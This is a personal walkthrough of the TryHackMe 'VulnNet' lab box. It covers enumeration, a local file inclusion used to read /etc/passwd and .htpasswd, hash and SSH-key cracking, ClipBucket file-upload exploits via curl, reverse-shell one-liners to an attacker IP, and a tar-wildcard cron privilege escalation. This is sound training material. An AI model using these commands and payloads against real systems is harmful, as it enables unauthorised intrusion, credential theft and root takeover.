# https://tryhackme.com/room/vulnnet1
## Recon
### nmap
```
$ nmap -sS vulnnet.thm
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-10 15:14 UTC
Nmap scan report for vulnnet.thm (10.10.143.64)
Host is up (0.064s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```
$ nmap -sV -script default -p 22,80 vulnnet.thm
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-10 15:15 UTC
Nmap scan report for vulnnet.thm (10.10.143.64)
Host is up (0.064s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ea:c9:e8:67:76:0a:3f:97:09:a7:d7:a6:63:ad:c1:2c (RSA)
|   256 0f:c8:f6:d3:8e:4c:ea:67:47:68:84:dc:1c:2b:2e:34 (ECDSA)
|_  256 05:53:99:fc:98:10:b5:c3:68:00:6c:29:41:da:a5:c9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: VulnNet
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Enumeration
#### Directory
```
$ ffuf -u http://vulnnet.thm/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -s
img
css
js
fonts
server-status
```

Two files in js:
```
[ ]	index__7ed54732.js	2021-01-23 20:08 	3.8K
[ ]	index__d8338055.js	2021-01-23 20:08 	2.0K
```
In index__d833055.js there is a URL: (had to look in a writeup for this)
```
http://vulnnet.thm/index.php?referer=
```
And from the source of index.php we see that these scripts are loaded at the end.

```
ffuf -u http://broadcast.vulnnet.thm/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
misc                    [Status: 401, Size: 468, Words: 42, Lines: 15, Duration: 83ms]
22                      [Status: 401, Size: 468, Words: 42, Lines: 15, Duration: 83ms]
page                    [Status: 401, Size: 468, Words: 42, Lines: 15, Duration: 83ms]
17                      [Status: 401, Size: 468, Words: 42, Lines: 15, Duration: 83ms]
16                      [Status: 401, Size: 468, Words: 42, Lines: 15, Duration: 84ms]
features                [Status: 401, Size: 468, Words: 42, Lines: 15, Duration: 84ms]
23                      [Status: 401, Size: 468, Words: 42, Lines: 15, Duration: 83ms]
```

All results in 401 (forbidden), which means the directory enumeration
isn't possible without authentication.

#### Subdomain
Found 5829 by running without -fs and see what size every result reported.
```
$ ffuf -u http://vulnnet.thm -H "Host: FUZZ.vulnnet.thm" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -fs 5829
broadcast
Broadcast
```

Navigating to http://broadcast.vulnnet.thm results in a http-login prompt (basic authentication).

#### Filenames
```
$ ffuf -u http://vulnnet.thm/FUZZ -e .php,.txt,.html -w /usr/share/seclists/Discovery/Web-Content/big.txt
.htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 64ms]
.htaccess.php           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 62ms]
.htaccess.txt           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 65ms]
.htaccess.html          [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 63ms]
.htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 62ms]
.htpasswd.php           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 63ms]
.htpasswd.html          [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 63ms]
.htpasswd.txt           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 63ms]
LICENSE.txt             [Status: 200, Size: 1109, Words: 208, Lines: 26, Duration: 84ms]
css                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 91ms]
fonts                   [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 101ms]
img                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 65ms]
index.php               [Status: 200, Size: 5829, Words: 1689, Lines: 142, Duration: 63ms]
js                      [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 63ms]
login.html              [Status: 200, Size: 2479, Words: 633, Lines: 70, Duration: 62ms]
server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 66ms]
```
LICENSE.TXT stands out
##### LICENSE.TXT
```
/* zlib.h -- interface of the 'zlib' general purpose compression library
  version 1.2.11, January 15th, 2017

  Copyright (C) 1995-2017 Jean-loup Gailly and Mark Adler

  This software is provided 'as-is', without any express or implied
  warranty.  In no event will the authors be held liable for any damages
  arising from the use of this software.

  Permission is granted to anyone to use this software for any purpose,
  including commercial applications, and to alter it and redistribute it
  freely, subject to the following restrictions:

  1. The origin of this software must not be misrepresented; you must not
     claim that you wrote the original software. If you use this software
     in a product, an acknowledgment in the product documentation would be
     appreciated but is not required.
  2. Altered source versions must be plainly marked as such, and must not be
     misrepresented as being the original software.
  3. This notice may not be removed or altered from any source distribution.

  Jean-loup Gailly        Mark Adler
  jloup@gzip.org          madler@alumni.caltech.edu

*/
```

Tried to Google to find out if any project matched, ie had a LICENSE.TXT with the
same content. But no luck.

#### Website
The "Get Started" button leads to /login which "Isn't found on this server".
The "Sign in" in the upper right corner directs to /login.html which contains a
login form. The "Sign up" and "Forgot password" part doesn't seem to do anything.

Clicking on the login button with an empty user:pass as asdf:reqw redirects to this URL:
```
http://vulnnet.thm/login.html?login=asdf&password=reqw#
```

# Exploitation
The only maybe exploitable things I was able to find were the referer variable,
and the login page. So I'll try a few attacks against those.

## Login page
Tried to SQLi with the following URL:
```
http://vulnnet.thm/login.html?login=%27+OR+1%3D1%3B%23&password=asdf
```
But no luck. Leaving out one of the variables doesn't change the behavious either.

## referer
Used burp repeater for this.
### SQLi
```
http://vulnnet.thm/index.php?referer='+OR+1%3D1%3B%23
```
No luck

### Command injection
```
http://vulnnet.thm/index.php?referer=ls
```
Doesn't seem to do anything either.

### File inclusion (https://book.hacktricks.xyz/pentesting-web/file-inclusion)
For funsies, I'll use ffuf for this one.
```
$ ffuf -u http://vulnnet.thm/index.php?referer=FUZZ -w /usr/share/seclists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt -fs 5829
/etc/anacrontab         [Status: 200, Size: 6230, Words: 1710, Lines: 155, Duration: 55ms]
/etc/apache2/apache2.conf [Status: 200, Size: 13053, Words: 2630, Lines: 369, Duration: 55ms]
/etc/apache2/envvars    [Status: 200, Size: 7611, Words: 1878, Lines: 189, Duration: 55ms]
/etc/apache2/mods-available/actions.load [Status: 200, Size: 5895, Words: 1691, Lines: 143, Duration: 56ms]
/etc/apache2/magic      [Status: 200, Size: 36892, Words: 5756, Lines: 1077, Duration: 55ms]
...
```
-fs 5829 was found by changing referer to refererrr in order to find the failing return values.

Here I find a bunch of files, so lets take a closer look in the burp repeater.

By looking at the response in Burp, we can see that the file content is printed
out at the end of the site. I would be very interested in finding out why.
We can investigate that once we get a shell.

## hydra:
Tried to crack the passwords using hydra.
```
$ hydra -l admin -P /usr/share/wordlists/rockyou.txt -f vulnnet.thm http-get-form "/login.html:login=^USER^&password=^PASS^:F=invalid"
```
Unsuccessfully.
## hydra
Try to crack the broadcast.vulnnet.thm using hydra.
```
$ hydra -l admin -P /usr/share/wordlists/rockyou.txt -f broadcast.vulnnet.thm http-get /
```
Unsuccessfully.

## Using LFI to find a way in
Lets check out some useful files.
```
# GET /index.php?referer=/etc/passwd HTTP/1.1
:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:111::/run/uuidd:/usr/sbin/nologin
lightdm:x:106:113:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:107:117::/nonexistent:/bin/false
kernoops:x:108:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
pulse:x:109:119:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
avahi:x:110:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
hplip:x:111:7:HPLIP system user,,,:/var/run/hplip:/bin/false
server-management:x:1000:1000:server-management,,,:/home/server-management:/bin/bash
mysql:x:112:123:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
```

Focus on the ones with an actual shell.
```
:x:0:0:root:/root:/bin/bash
server-management:x:1000:1000:server-management,,,:/home/server-management:/bin/bash
```
Looks like there is a server-management user.

There's a list of other files I'd like to check out:
```
/etc/ssh/sshd_config # To see if we can login using a password, or just key-based is allowed
/home/server-management/.bashrc     # .bashrc is highly likely to exist since
                                    # the shell is /bin/bash, so try first with
                                    # that file to see if we can read from server-managements home-dir.
/home/server-management/.ssh/id_rsa     # Private key
/home/server-management/.ssh/id_rsa.pub # Public key
/home/server-management/.ssh/config     # May contain non-default names of ssh-key
/home/server-management/.ssh/authorized_keys
/home/server-management/user.txt
```

Turns out we get no output from
```
# GET /index.php?referer=/home/server-management/.bashrc HTTP/1.1
```
which makes sense, since www-data (which I assume is the user that runs the
web-server) most likely don't have access to /home/server-management.

Lets see if it is possible to login via password, since we can't obtain any
ssh-keys: (only included relevant lines
```
# GET /index.php?referer=/etc/ssh/sshd_config HTTP/1.1
#PasswordAuthentication yes
ChallengeResponseAuthentication no
UsePAM yes
```
This should mean that we could login via password. Even though one type
of password auth is disabled via "ChallengeResponseAuthentication no", it's still
enabled via the other two options (PasswordAuthentication defaults to yes).

Something else just occured. Perhaps we could enumerate which files exists in /etc
by comparing the result of
```
$ ffuf -u http://vulnnet.thm/index.php?referer=FUZZ -w /usr/share/seclists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt -fs 5829 -s
```
and what is in the wordlist, since -fs would have filtered out the non-existent files.

If we try it with a file that is guaranteed not to exist:
```
$ ffuf -u http://vulnnet.thm/index.php?referer=FUZZ -w ./wordlist.txt
/etc/asdjfailnsonasdf   [Status: 200, Size: 5829, Words: 1689, Lines: 142, Duration: 53ms]
```
it still returns size=5829, which means that we can enumerate many of the files
in /etc. Those not in the wordlist will of course not be enumerated.

At this point im sort of lost, and hydra is not managing to find any valid ssh-pass.

After a peek in a write-up:
According to https://www.digitalocean.com/community/tutorials/how-to-set-up-password-authentication-with-apache-on-ubuntu-14-04,
http basic auth is set up by creating a .htpasswd in /etc/apache2/.htpasswd. Could
probably be in other dirs as well, but lets try the most obvious.
```
GET /index.php?referer=/etc/apache2/.htpasswd HTTP/1.1
developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0
```
So this should be the user:hash for http://broadcast.vulnnet.thm.

### hydra ssh cracking:
```
$ hydra -l server-management -P /usr/share/wordlists/rockyou.txt vulnnet.thm -t 4 ssh
```

### hydra htpasswd crack
```
$ hashcat --force -m 1600 hash.txt /usr/share/wordlists/rockyou.txt # 1600 for md5apr1 hash
$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0:9972761drmfsls
```

## Successfull basic auth login
broadcast.vulnnet.thm takes me to a CLIPBUCKET site.
We can also sign up a new user.

When entering all the fields, and clicking Register, we get an error message
telling us to pick a category. There is no field for the category. But if we
intercept the request with burp, we see that it contains the following:
```
username=user&email=user%40example.com&password=pass&cpassword=pass&dob=1988-04-04&country=NU&gender=Male&category=0&agree=yes&signup=signup
```
So lets try changing "category" to 1 and see what happens. Same error message.
Lets try setting it to "user".
Didn't get an error message.
It seems to be a bug in clipbucket:
https://github.com/MacWarrior/clipbucket-v5/issues/60

I didn't realize it is an actual piece of software.
According to the source it is version 4.0:
```
Signup - ClipBucket v4.0
```

Looks like that version of ClipBucket might be vulnerable to a few CVE-exploits,
including one command injection, and one arbitrary file upload, both unauthenticated.
https://sec-consult.com/vulnerability-lab/advisory/os-command-injection-arbitrary-file-upload-sql-injection-in-clipbucket/

And there is a metasploit module for one of them.
```
https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/multi/http/clipbucket_fileupload_exec
```

We should be able to use either of them to get a reverse shell.

### Obtaining a reverse shell

#### CVE-2018-7664 (unauthenticated OS command injection)
From https://sec-consult.com/vulnerability-lab/advisory/os-command-injection-arbitrary-file-upload-sql-injection-in-clipbucket/.
Since it is protected by HTTP Basic Auth, we need to add the -u option and supply
the user:pass we found earlier.

Create a random jpg file 
```
$ echo -n -e '\xff\xd8\xff' > pfile.jpg # Create a jpeg byte header in case the server will validate the file type
$ cat /dev/urandom | head -n100 >> pfile.jpg
```
We need to remove the " around Filedata=@pfile.jpg
```
$ curl -u developers:9972761drmfsls -F Filedata=@pfile.jpg -F "file_name=aa.php ||bash -i >& /dev/tcp/10.14.21.85/4444 0>&1" broadcast.vulnnet.thm/api/file_uploader.php
{"success":"yes","file_name":"aa.php |bash -i >& \/dev\/tcp\/10.14.21.85\/4444 0>&1"}
```

Upload was successful, but no reverse shell on our listener.

#### CVE-2018-7665
```
$ curl -u developers:9972761drmfsls -F file=@revshell.php -F "plupload=1" -F "name=shell.php" "http://broadcast.vulnnet.thm/actions/beats_uploader.php"
creating file{"success":"yes","file_name":"16629167633a9c29","extension":"php","file_directory":"CB_BEATS_UPLOAD_DIR"}
```
The response gives us the filename: 1662903652ba1a0a.php, but we still need to
find out the value of CB_BEATS_UPLOAD_DIR is.

By googling the metasploit module for the CVE, we find that the file is uploaded
to http://broadcast.vulnnet.thm/actions/CB_BEATS_UPLOAD_DIR/16629167633a9c29.php

If we navigate it we now get a shell on our listener.

## Privelege escalation
Let's start by stabilizing the shell.
```
$ /usr/bin/python3 -c 'import pty;pty.spawn("/bin/bash")' # In the reverse shell
Ctrl-Z
$ stty raw -echo # On our local machine
$ fg # To bring back nc into the foreground
$ reset
$ export SHELL=/bin/bash
$ export TERM=screen-256color
$ stty rows 74 columns 280
```
```
$ id     
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Recon
```
www-data@vulnnet:/$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/2   * * * *   root    /var/opt/backupsrv.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```
```
$ ls -lh
total 4.0K
-rwxr--r-- 1 root root 530 Jan 23  2021 backupsrv.sh
/b```
```
www-data@vulnnet:/var/opt$ cat backupsrv.sh 
#!/bin/bash

# Where to backup to.
dest="/var/backups"

# What to backup. 
cd /home/server-management/Documents
backup_files="*"

# Create archive filename.
day=$(date +%A)
hostname=$(hostname -s)
archive_file="$hostname-$day.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"
date
echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"
date

# Long listing of files in $dest to check file sizes.
```
It uses tar, so possibly can use tar wildcard exploit.
This seems to be more of a thing we can use to get from server-management -> root

```
$ find / -user server-management -type f -exec ls -lh {} \; 2>/dev/null
-rw-rw-r-- 1 server-management server-management 1.5K Jan 24  2021 /var/backups/ssh-backup.tar.gz
```

Lets move it to /tmp and unpack it:
```
www-data@vulnnet:/var/backups$ cp ssh-backup.tar.gz /tmp/
www-data@vulnnet:/tmp$ tar xvvfz ssh-backup.tar.gz
-rw------- server-management/server-management 1766 2021-01-24 14:07 id_rsa
www-data@vulnnet:/tmp$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6CE1A97A7DAB4829FE59CC561FB2CCC4

mRFDRL15t7qvaZxJGHDJsewnhp7wESbEGxeAWtCrbeIVJbQIQd8Z8SKzpvTMFLtt
dseqsGtt8HSruVIq++PFpXRrBDG5F4rW5B6VDOVMk1O9J4eHEV0N7es+hZ22o2e9
60qqj7YkSY9jVj5Nqq49uUNUg0G0qnWh8M6r8r83Ov+HuChdeNC5CC2OutNivl7j
dmIaFRFVwmWNJUyVen1FYMaxE+NojcwsHMH8aV2FTiuMUsugOwZcMKhiRPTElojn
tDrlgNMnP6lMkQ6yyJEDNFtn7tTxl7tqdCIgB3aYQZXAfpQbbfJDns9EcZEkEkrp
hs5Li20NbZxrtI6VPq6/zDU1CBdy0pT58eVyNtDfrUPdviyDUhatPACR20BTjqWg
3BYeAznDF0MigX/AqLf8vA2HbnRTYWQSxEnAHmnVIKaNVBdL6jpgmw4RjGzsUctk
jB6kjpnPSesu4lSe6n/f5J0ZbOdEXvDBOpu3scJvMTSd76S4n4VmNgGdbpNlayj5
5uJfikGR5+C0kc6PytjhZrnODRGfbmlqh9oggWpflFUm8HgGOwn6nfiHBNND0pa0
r8EE1mKUEPj3yfjLhW6PcM2OGEHHDQrdLDy3lYRX4NsCRSo24jtgN1+aQceNFXQ7
v8Rrfu5Smbuq3tBjVgIWxolMy+a145SM1Inewx4V4CX1jkk6sp0q9h3D03BYxZjz
n/gMR/cNgYjobbYIEYS9KjZSHTucPANQxhUy5zQKkb61ymsIR8O+7pHTeReelPDq
nv7FA/65Sy3xSUXPn9nhqWq0+EnhLpojcSt6czyX7Za2ZNP/LaFXpHjwYxBgmMkf
oVmLmYrw6pOrLHb7C5G6eR6D/WwRjhPpuhCWWnz+NBDQXIwUzzQvAyHyb7D1+Itn
MesF+L9zuUADGeuFl12dLahapM5ZuKURwnzW9+RwmmJSuT0AnN5OyuJtwfRznjyZ
7f5NP9u6vF0NQHYZI7MWcH7PAQsGTw3xzBmJdIfF71DmG0rqqCR7sB2buhoI4ve3
obvpmg2CvE+rnGS3wxuaEO0mWxVrSYiWdi7LJZvppwRF23AnNYNTeCw4cbvvCBUd
hKvhau01yVW2N/R8B43k5G9qbeNUmIZIltJZaxHnQpJGIbwFSItih49Fyr29nURK
ZJbyJbb4+Hy2ZNN4m/cfPNmCFG+w0A78iVPrkzxdWuTaBOKBstzpvLBA20d4o3ow
wC6j98TlmFUOKn5kJmX1EQAHJmNwERNKFmNwgHqgwYNzIhGRNdyoqJxBrshVjRk9
GSEZHtyGNoBqesyZg8YtsYIFGppZFQmVumGCRlfOGB9wPcAmveC0GNfTygPQlEMS
hoz4mTIvqcCwWibXME2g8M9NfVKs7M0gG5Xb93MLa+QT7TyjEn6bDa01O2+iOXkx
0scKMs4v3YBiYYhTHOkmI5OX0GVrvxKVyCJWY1ldVfu+6LEgsQmUvG9rYwO4+FaW
4cI3x31+qDr1tCJMLuPpfsyrayBB7duj/Y4AcWTWpY+feaHiDU/bQk66SBqW8WOb
d9vxlTg3xoDcLjahDAwtBI4ITvHNPp+hDEqeRWCZlKm4lWyI840IFMTlVqwmxVDq
-----END RSA PRIVATE KEY-----
```
Bingo! Now we can copy it to the attackbox and login.

### server-management -> root
On AttackBox:
Copied it to srvmgmt
```
$ chmod 600 servmgmt
$ ssh -i ./servmgmt server-management@vulnnet.thm
Enter passphrase for key './servmgmt':
```
Password protected. I have cracked this before using some either john or hashcat.

```
$ ssh2john servmgmt > key.john
$ john key.john --wordlist:/usr/share/wordlists/rockyou.txt
oneTWO3gOyac     (servmgmt)
```
```
$ ssh -i ./servmgmt server-management@vulnnet.thm
Enter passphrase for key './servmgmt':
server-management@vulnnet:~$ id
uid=1000(server-management) gid=1000(server-management) groups=1000(server-management)
```

Since crontab runs the backupsrv.sh as root, and backupsrv.sh uses a wildcard
in the in the tar command, we can use tar to gain a shell.
https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks

Not sure if we can drop from server-management into a root shell, but we could
setup a reverse shell
```
server-management@vulnnet:~/Documents$ echo "bash -i >& /dev/tcp/10.14.21.85/4242 0>&1" > /tmp/shell.sh

``` 

### Referer
In /var/www/main/index.php we find the answer as to why the referer parameter
behaved the way it did:
```
...
<?php
$file = $_GET['referer'];
$filter = str_replace('../','',$file);
include($filter); <--- This will insert the contents of $filter. Intended for other php-files.
?>
...
```

shell.sh:
```
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
```
Didn't work,
but this did:
```
mkfifo /tmp/lhennp; nc 10.14.21.85 4242 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp
```
Would like to figure out why.

```
Ncat: Connection from 10.10.20.193:58888.
pwd
/home/server-management/Documents
id
uid=0(root) gid=0(root) groups=0(root)
```


# Questions
1. What is the user flag?
THM{xxxxxxxxxxxxxxxxxxxxxxx}

2. What is the root flag?

Notes:
Need to find a automated way to enumerate possible links in a website.
Need to be more diligent in writing down things. I needed a writeup to remind
me of basic auth as a path forward. Didn't know that creds were stored in htpasswd,
 keep that in mind for later.

All in all, the box matched my skill level quite well. I needed two nudges,
one for the referer variable and one for the basic auth creds.

The referer I should have figured out myself, if I just was more diligent in looking
through the code.
